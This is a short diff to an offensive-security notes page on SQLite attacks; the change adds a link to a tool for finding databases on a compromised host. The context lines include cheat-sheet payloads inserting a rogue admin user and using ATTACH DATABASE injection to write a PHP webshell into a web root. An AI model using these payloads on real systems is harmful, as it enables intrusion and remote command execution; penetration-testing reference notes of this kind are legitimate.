@@ -138,8 +138,10 @@ INSERT INTO users (username, password, role) VALUES ('x', '<hash>', 'admin');
 | Dump schema | `SELECT name, sql FROM sqlite_master` |
 | Injection → webshell | `ATTACH DATABASE '/var/www/html/sh.php' AS s; CREATE TABLE s.p(x); INSERT INTO s.p VALUES('<?php system($_GET[0]);?>')` |
 
+> [!note] **See also** — [[Exploits/find_sqlite|find_sqlite.sh]] (custom tool: locate every SQLite DB on a foothold by magic bytes, incl. unnamed ones), [[Tools/Database/sqlite3|sqlite3]].
+
 ---
 
 *Created: 2026-08-20*
-*Updated: 2026-08-20*
+*Updated: 2026-08-21*
 *Model: claude-opus-5*
